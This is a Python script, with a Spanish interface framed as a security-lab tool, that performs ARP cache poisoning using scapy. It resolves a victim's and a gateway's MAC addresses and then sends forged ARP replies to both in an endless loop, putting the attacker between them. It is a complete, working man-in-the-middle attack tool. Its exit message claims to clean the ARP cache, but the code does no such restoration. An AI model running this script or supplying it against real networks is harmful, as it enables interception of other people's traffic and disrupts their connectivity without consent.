import scapy.all as scapy
import time
import sys
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.live import Live

console = Console()

def get_banner():
    banner = """
    [bold cyan]
     █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
    ███████║██████╔╝██████╔╝    ███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝
    ██╔══██║██╔══██╗██╔══██╗    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
    ██║  ██║██║  ██║██║  ██║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
    [/bold cyan]
    [bold white]   > Laboratorio de Seguridad - Tool de Envenenamiento ARP <[/bold white]
    """
    return Panel(banner, border_style="cyan")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    
    packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def start_attack():
    console.clear()
    console.print(get_banner())

    target_ip = Prompt.ask("[bold yellow]IP de la Víctima (Win7)[/bold yellow]", default="192.168.1.120")
    gateway_ip = Prompt.ask("[bold yellow]IP del Gateway (Ubuntu)[/bold yellow]", default="192.168.1.1")

    with console.status("[bold green]Escaneando objetivos...[/bold green]"):
        victim_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        console.print("[bold red][!] ERROR: No se obtuvo respuesta de los nodos.[/bold red]")
        sys.exit()

    table = Table(title="Panel de Control de Ataque")
    table.add_column("Estado", justify="center", style="green")
    table.add_column("Paquetes Inyectados", justify="center", style="magenta")

    sent_packets = 0
    
    try:
        with Live(table, refresh_per_second=1) as live:
            while True:
                spoof(target_ip, gateway_ip, victim_mac)
                spoof(gateway_ip, target_ip, gateway_mac)
                
                sent_packets += 2
                table.rows[:] = [] 
                table.add_row("[blink]ATACANDO[/blink]", str(sent_packets))
                time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Deteniendo ataque. Limpiando caché ARP...[/bold red]")

if __name__ == "__main__":
    start_attack()


